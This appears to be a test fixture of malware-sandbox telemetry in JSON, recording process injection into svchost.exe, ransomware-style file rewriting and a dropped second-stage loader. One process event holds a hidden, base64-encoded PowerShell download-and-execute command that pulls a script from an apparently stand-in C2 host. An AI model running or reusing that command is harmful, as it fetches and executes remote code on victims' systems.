@@ -1,0 +1,404 @@
+{
+ "details": {
+  "6fc8aa0f2307285a4b9ca6b4": {
+   "source": {
+    "@timestamp": "2026-10-13T15:40:39.617Z",
+    "event": {
+     "id": "6fc8aa0f2307285a4b9ca6b4",
+     "sequence": 241,
+     "kind": "event",
+     "category": [
+      "process"
+     ],
+     "action": "NtWriteVirtualMemory",
+     "module": "capemon",
+     "dataset": "capemon.api"
+    },
+    "tartarus": {
+     "analysis_id": 45,
+     "lane": "api",
+     "phase": "final",
+     "summary": "benign.exe called NtWriteVirtualMemory into svchost.exe (4412), 0x1d4a bytes",
+     "inject": {
+      "target_pid": 4412
+     },
+     "raw": {
+      "api": "NtWriteVirtualMemory",
+      "return": "0x00000000",
+      "status": true,
+      "tid": 6120,
+      "timestamp": "2026-10-13 15:39:51,402",
+      "category": "process",
+      "arguments": [
+       {
+        "name": "ProcessHandle",
+        "value": "0x0000030c"
+       },
+       {
+        "name": "BaseAddress",
+        "value": "0x0000023a5c3f0000"
+       },
+       {
+        "name": "NumberOfBytesToWrite",
+        "value": "7498"
+       },
+       {
+        "name": "NumberOfBytesWritten",
+        "value": "7498"
+       }
+      ],
+      "caller": "0x7ff6123456a0",
+      "parentcaller": "0x7ff612345090",
+      "repeated": 0
+     }
+    },
+    "process": {
+     "pid": 9708,
+     "name": "benign.exe",
+     "executable": "C:\\Users\\Analyst\\AppData\\Local\\Temp\\benign.exe",
+     "entity_id": "45:9708@1760370390",
+     "command_line": "C:\\Users\\Analyst\\AppData\\Local\\Temp\\benign.exe",
+     "thread": {
+      "id": 6120
+     },
+     "parent": {
+      "pid": 1020,
+      "name": "explorer.exe"
+     },
+     "integrity_level": "Medium"
+    },
+    "api": {
+     "name": "NtWriteVirtualMemory",
+     "category": "process",
+     "status": true,
+     "return_value": "0",
+     "arguments": {
+      "ProcessHandle": "0x0000030c",
+      "BaseAddress": "0x0000023a5c3f0000",
+      "Buffer": "0x000000a1b2c3d4e0",
+      "NumberOfBytesToWrite": "7498",
+      "NumberOfBytesWritten": "7498"
+     },
+     "repeated": 1
+    },
+    "related": {
+     "events": []
+    }
+   },
+   "references": {
+    "ids": [],
+    "total": 0
+   },
+   "referenced_by": {
+    "ids": [
+     "0090624136bb0fdbc2b65be9"
+    ],
+    "total": 1
+   }
+  },
+  "0090624136bb0fdbc2b65be9": {
+   "source": {
+    "@timestamp": "2026-10-13T15:40:39.668Z",
+    "event": {
+     "id": "0090624136bb0fdbc2b65be9",
+     "sequence": 243,
+     "kind": "alert",
+     "category": [
+      "intrusion_detection"
+     ],
+     "action": "rule-matched",
+     "module": "cape",
+     "dataset": "cape.match",
+     "severity": 3
+    },
+    "tartarus": {
+     "analysis_id": 45,
+     "lane": "process",
+     "phase": "final",
+     "summary": "Code injection into svchost.exe (4412) with CreateRemoteThread",
+     "raw": {
+      "name": "injection_createremotethread",
+      "severity": 3,
+      "description": "Code injection with CreateRemoteThread in a remote process",
+      "ttps": [
+       "T1055"
+      ]
+     }
+    },
+    "process": {
+     "pid": 9708,
+     "name": "benign.exe",
+     "executable": "C:\\Users\\Analyst\\AppData\\Local\\Temp\\benign.exe",
+     "entity_id": "45:9708@1760370390",
+     "command_line": "C:\\Users\\Analyst\\AppData\\Local\\Temp\\benign.exe"
+    },
+    "rule": {
+     "name": "injection_createremotethread",
+     "ruleset": "cape",
+     "id": "cape-injection_createremotethread"
+    },
+    "related": {
+     "events": [
+      "34b1b38e39ad84dbabf739ef",
+      "611bc2672f7a8720927118a7",
+      "6fc8aa0f2307285a4b9ca6b4",
+      "0b00f7a8f868e54916df1f73"
+     ]
+    }
+   },
+   "references": {
+    "ids": [
+     "34b1b38e39ad84dbabf739ef",
+     "611bc2672f7a8720927118a7",
+     "6fc8aa0f2307285a4b9ca6b4",
+     "0b00f7a8f868e54916df1f73"
+    ],
+    "total": 4
+   },
+   "referenced_by": {
+    "ids": [
+     "04e65c84a9210f07982d7321"
+    ],
+    "total": 1
+   }
+  },
+  "c78e67c0d4d1b5abd8d8447b": {
+   "source": {
+    "@timestamp": "2026-10-13T15:40:39.728Z",
+    "event": {
+     "id": "c78e67c0d4d1b5abd8d8447b",
+     "sequence": 244,
+     "kind": "alert",
+     "category": [
+      "intrusion_detection"
+     ],
+     "action": "rule-matched",
+     "module": "cape",
+     "dataset": "cape.match",
+     "severity": 4
+    },
+    "tartarus": {
+     "analysis_id": 45,
+     "lane": "process",
+     "phase": "final",
+     "summary": "Mass file modification: 120 documents rewritten under C:\\Users\\Analyst",
+     "raw": {
+      "name": "ransomware_files",
+      "severity": 4,
+      "description": "Appends a known ransomware file extension to files that have been encrypted"
+     }
+    },
+    "process": {
+     "pid": 9708,
+     "name": "benign.exe",
+     "executable": "C:\\Users\\Analyst\\AppData\\Local\\Temp\\benign.exe",
+     "entity_id": "45:9708@1760370390",
+     "command_line": "C:\\Users\\Analyst\\AppData\\Local\\Temp\\benign.exe"
+    },
+    "rule": {
+     "name": "ransomware_files",
+     "ruleset": "cape",
+     "id": "cape-ransomware_files"
+    },
+    "related": {
+     "events": [
+      "e7eb1149a47ff9e6122c692d",
+      "1ce8252ac4132de293a13919",
+      "a7b212a228b02f22569e54b8",
+      "e0822da0b4bed51c7fddd7ec",
+      "90c30f0bbd5093a04c3cc057",
+      "a9541b7afe4f45bc41a90469",
+      "31b34f135516c181d73fe681",
+      "6ef0a09c9d1c583d604c186e",
+      "795bb9de4ee5396006a5aa43",
+      "a670ef27d9a2da218b4a2e13",
+      "460415d40c732424adc94d6f",
+      "fb2ae5d7fc56e5f28e999195"
+     ]
+    }
+   },
+   "references": {
+    "ids": [
+     "e7eb1149a47ff9e6122c692d",
+     "1ce8252ac4132de293a13919",
+     "a7b212a228b02f22569e54b8",
+     "e0822da0b4bed51c7fddd7ec",
+     "90c30f0bbd5093a04c3cc057",
+     "a9541b7afe4f45bc41a90469",
+     "31b34f135516c181d73fe681",
+     "6ef0a09c9d1c583d604c186e",
+     "795bb9de4ee5396006a5aa43",
+     "a670ef27d9a2da218b4a2e13",
+     "460415d40c732424adc94d6f",
+     "fb2ae5d7fc56e5f28e999195"
+    ],
+    "total": 120
+   },
+   "referenced_by": {
+    "ids": [
+     "04e65c84a9210f07982d7321"
+    ],
+    "total": 1
+   }
+  },
+  "04e65c84a9210f07982d7321": {
+   "source": {
+    "@timestamp": "2026-10-13T15:40:39.886Z",
+    "event": {
+     "id": "04e65c84a9210f07982d7321",
+     "sequence": 248,
+     "kind": "alert",
+     "category": [
+      "intrusion_detection"
+     ],
+     "action": "rule-matched",
+     "module": "sigma",
+     "dataset": "sigma.match",
+     "severity": 4
+    },
+    "tartarus": {
+     "analysis_id": 45,
+     "lane": "process",
+     "phase": "final",
+     "summary": "Process injection followed by mass file modification",
+     "raw": {
+      "name": "process_injection_chain",
+      "severity": 4
+     }
+    },
+    "process": {
+     "pid": 9708,
+     "name": "benign.exe",
+     "executable": "C:\\Users\\Analyst\\AppData\\Local\\Temp\\benign.exe",
+     "entity_id": "45:9708@1760370390",
+     "command_line": "C:\\Users\\Analyst\\AppData\\Local\\Temp\\benign.exe"
+    },
+    "rule": {
+     "name": "process_injection_chain",
+     "ruleset": "sigma",
+     "id": "cape-process_injection_chain"
+    },
+    "related": {
+     "events": [
+      "0090624136bb0fdbc2b65be9",
+      "c78e67c0d4d1b5abd8d8447b"
+     ]
+    }
+   },
+   "references": {
+    "ids": [
+     "0090624136bb0fdbc2b65be9",
+     "c78e67c0d4d1b5abd8d8447b"
+    ],
+    "total": 2
+   },
+   "referenced_by": {
+    "ids": [],
+    "total": 0
+   }
+  },
+  "cc231741177d8369f08172ea": {
+   "source": {
+    "@timestamp": "2026-10-13T15:40:39.273Z",
+    "event": {
+     "id": "cc231741177d8369f08172ea",
+     "sequence": 237,
+     "kind": "event",
+     "category": [
+      "process"
+     ],
+     "action": "process-created",
+     "module": "capemon",
+     "dataset": "capemon.process"
+    },
+    "tartarus": {
+     "analysis_id": 45,
+     "lane": "process",
+     "phase": "final",
+     "summary": "cmd.exe started powershell.exe (powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAtAHUAcABkAGEAdABlAHMALgBuAGUAdAAvAHMAdABhAGcAZQAyAC4AcABzADEAIgApADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBjADIALgBlAHYAaQBsAC0AdQBwAGQAYQB0AGUAcwAuAG4AZQB0AC8AcwB0AGEAZwBlADIALgBwAHMAMQAiACkAOwAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQA)",
+     "raw": {
+      "cmdline": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAtAHUAcABkAGEAdABlAHMALgBuAGUAdAAvAHMAdABhAGcAZQAyAC4AcABzADEAIgApADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBjADIALgBlAHYAaQBsAC0AdQBwAGQAYQB0AGUAcwAuAG4AZQB0AC8AcwB0AGEAZwBlADIALgBwAHMAMQAiACkAOwAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQA",
+      "ppid": 2476
+     }
+    },
+    "process": {
+     "pid": 2476,
+     "name": "cmd.exe",
+     "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "entity_id": "45:2476@1760370391",
+     "command_line": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAtAHUAcABkAGEAdABlAHMALgBuAGUAdAAvAHMAdABhAGcAZQAyAC4AcABzADEAIgApADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBjADIALgBlAHYAaQBsAC0AdQBwAGQAYQB0AGUAcwAuAG4AZQB0AC8AcwB0AGEAZwBlADIALgBwAHMAMQAiACkAOwAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQA",
+     "parent": {
+      "pid": 2476,
+      "name": "cmd.exe"
+     }
+    },
+    "related": {
+     "events": []
+    }
+   },
+   "references": {
+    "ids": [],
+    "total": 0
+   },
+   "referenced_by": {
+    "ids": [],
+    "total": 0
+   }
+  },
+  "971da25fef497559f9b036b8": {
+   "source": {
+    "@timestamp": "2026-10-13T15:40:39.393Z",
+    "event": {
+     "id": "971da25fef497559f9b036b8",
+     "sequence": 238,
+     "kind": "event",
+     "category": [
+      "file"
+     ],
+     "action": "file-created",
+     "module": "capemon",
+     "dataset": "capemon.file"
+    },
+    "tartarus": {
+     "analysis_id": 45,
+     "lane": "file",
+     "phase": "final",
+     "summary": "benign.exe created C:\\Users\\Analyst\\AppData\\Local\\Temp\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\loader_stage_two.exe",
+     "raw": {
+      "path": "C:\\Users\\Analyst\\AppData\\Local\\Temp\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\loader_stage_two.exe",
+      "operation": "create"
+     }
+    },
+    "process": {
+     "pid": 9708,
+     "name": "benign.exe",
+     "executable": "C:\\Users\\Analyst\\AppData\\Local\\Temp\\benign.exe",
+     "entity_id": "45:9708@1760370390",
+     "command_line": "C:\\Users\\Analyst\\AppData\\Local\\Temp\\benign.exe"
+    },
+    "file": {
+     "path": "C:\\Users\\Analyst\\AppData\\Local\\Temp\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\nested_directory_with_a_long_name\\loader_stage_two.exe",
+     "name": "loader_stage_two.exe"
+    },
+    "related": {
+     "events": []
+    }
+   },
+   "references": {
+    "ids": [],
+    "total": 0
+   },
+   "referenced_by": {
+    "ids": [],
+    "total": 0
+   }
+  }
+ },
+ "special": {
+  "api": "6fc8aa0f2307285a4b9ca6b4",
+  "alert": "0090624136bb0fdbc2b65be9",
+  "bigAlert": "c78e67c0d4d1b5abd8d8447b",
+  "longProcess": "cc231741177d8369f08172ea",
+  "longFile": "971da25fef497559f9b036b8"
+ }
+}
